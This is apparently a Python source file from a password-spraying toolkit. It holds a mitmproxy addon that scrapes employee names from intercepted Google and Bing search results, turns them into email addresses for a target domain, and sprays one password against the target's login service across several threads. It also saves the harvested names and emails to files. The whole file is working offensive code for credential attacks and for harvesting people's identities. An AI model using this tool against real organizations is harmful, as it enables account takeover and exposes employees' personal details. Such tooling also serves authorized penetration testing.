import signal
import asyncio
from sprayingtoolkit.core.parsers import bing, google
from sprayingtoolkit.core.utils.messages import print_good
from sprayingtoolkit.atomizer import Atomizer
from termcolor import colored
from mitmproxy import ctx, exceptions, http


class Vaporizer:

    def __init__(self):
        self.emails = set()
        self.names = set()
        self.atomizer = None

        self.loop = asyncio.get_event_loop()
        for sig in (signal.SIGINT, signal.SIGTERM):
            self.loop.add_signal_handler(sig, self.shutdown)

    def load(self, loader):
        loader.add_option(
            name="sprayer",
            typespec=str,
            default='',
            help="sprayer to use"
        )

        loader.add_option(
            name="domain",
            typespec=str,
            default='',
            help="domain to use for email generation"
        )

        loader.add_option(
            name="target",
            typespec=str,
            default='',
            help="target domain or url to password spray"
        )

        loader.add_option(
            name="password",
            typespec=str,
            default='',
            help="password to spray"
        )

        loader.add_option(
            name="email_format",
            typespec=str,
            default='{first}.{last}',
            help="email format",
        )

        loader.add_option(
            name="threads",
            typespec=int,
            default=3,
            help="number of concurrent threads",
        )

        loader.add_option(
            name="no_spray",
            typespec=bool,
            default=False,
            help="don't password spray, just parse emails",
        )

    def running(self):
        if not self.atomizer and not ctx.options.no_spray:
            self.atomizer = Atomizer(
                loop=self.loop,
                target=ctx.options.target,
                threads=ctx.options.threads
            )

            getattr(self.atomizer, ctx.options.sprayer.lower())()

    def response(self, flow: http.HTTPFlow) -> None:
        try:
            emails = []
            if "html" in flow.response.headers["Content-Type"] and len(flow.response.content):
                if "google.com" in flow.request.host:
                    names = google(flow.response.content)
                elif "bing.com" in flow.request.host:
                    names = bing(flow.response.content)
                else:
                    return

                for name in names:
                    first, last, full_text = name
                    ctx.log.info(colored(f"{full_text} => {first} {last}", "yellow"))
                    self.names.add(f"{first} {last}")

                    email = f"{ctx.options.email_format.format(first=first, last=last, f=first[:1], l=last[:1])}@{ctx.options.domain}".lower()
                    emails.append(email)

                ctx.log.info(print_good(f"Generated {len(emails)} email(s)"))

                if self.atomizer:
                    asyncio.ensure_future(
                        self.atomizer.atomize(
                            userfile=[email for email in emails if email not in self.emails],
                            password=ctx.options.password
                        )
                    )

                self.emails |= set(emails)
        except KeyError:
            pass

    def shutdown(self):
        with open("emails.txt", "a+") as email_file:
            for email in self.emails:
                email_file.write(email + '\n')

        with open("names.txt", "a+") as name_file:
            for name in self.names:
                name_file.write(name + '\n')

        ctx.log.info(print_good(f"Dumped {len(self.emails)} email(s) to emails.txt"))

        if self.atomizer:
            self.atomizer.shutdown()

        self.loop.stop()
        pending = asyncio.Task.all_tasks()
        self.loop.run_until_complete(asyncio.gather(*pending))


addons = [
    Vaporizer()
]
